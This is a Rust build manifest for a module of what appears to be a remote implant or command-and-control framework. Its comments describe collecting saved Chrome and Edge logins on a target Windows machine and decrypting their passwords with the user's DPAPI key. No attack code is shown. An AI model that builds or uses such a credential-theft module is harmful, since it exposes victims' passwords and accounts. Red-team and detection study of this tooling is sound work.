[package]
name = "rod-module-browser"
version = "1.0.0"
edition = "2021"

# The credential collection family's third module (architecture.md
# Sec 5.4): collect.browser, the Chromium login stores -- Chrome's and
# Edge's logins listed from the store's own bytes or exported with
# their passwords unsealed under the profile's DPAPI-fetched key. The
# SQLite parse is hand-rolled (no store library on the target) and the
# Windows half speaks kernel32, crypt32, and bcrypt directly: a module
# owes the loader no dependency for any of it. Built as a cdylib for
# Windows targets and delivered as a module.load task's content.

[lib]
# rlib beside cdylib so the bin target below links the same plugin code;
# cargo emits the rlib for internal use only, the cdylib is the artifact.
crate-type = ["cdylib", "rlib"]

[[bin]]
name = "rod-module-browser"
path = "src/main.rs"

[dependencies]
rod-plugin-sdk = { path = "../../plugin-sdk" }
